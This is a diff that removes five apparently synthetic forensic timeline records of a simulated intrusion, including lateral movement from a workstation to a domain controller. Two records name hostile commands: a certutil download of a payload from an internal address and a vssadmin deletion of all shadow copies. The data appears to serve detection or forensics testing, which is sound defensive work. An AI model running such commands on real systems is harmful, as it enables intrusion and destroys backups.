@@ -1,5 +1,0 @@
-{"datetime": "2024-03-15T07:58:03", "timestamp_desc": "Logon Event", "hostname": "WORKSTATION-01", "username": "jdoe", "message": "Event ID 4624 successful logon account jdoe logon type 3", "source_short": "EVT"}
-{"datetime": "2024-03-15T08:05:44", "timestamp_desc": "Process Creation", "hostname": "WORKSTATION-01", "username": "jdoe", "message": "certutil.exe urlcache download http://192.168.99.10/payload.exe", "source_short": "EVT"}
-{"datetime": "2024-03-15T08:11:22", "timestamp_desc": "Logon Event", "hostname": "SERVER-FILE-01", "username": "jdoe", "message": "Event ID 4624 successful logon account jdoe lateral movement", "source_short": "EVT"}
-{"datetime": "2024-03-15T08:19:30", "timestamp_desc": "Logon Event", "hostname": "SERVER-DC-01", "username": "jdoe", "message": "Event ID 4624 successful logon domain controller access", "source_short": "EVT"}
-{"datetime": "2024-03-15T08:21:08", "timestamp_desc": "Process Creation", "hostname": "SERVER-DC-01", "username": "jdoe", "message": "vssadmin delete shadows all quiet shadow copy deletion", "source_short": "EVT"}
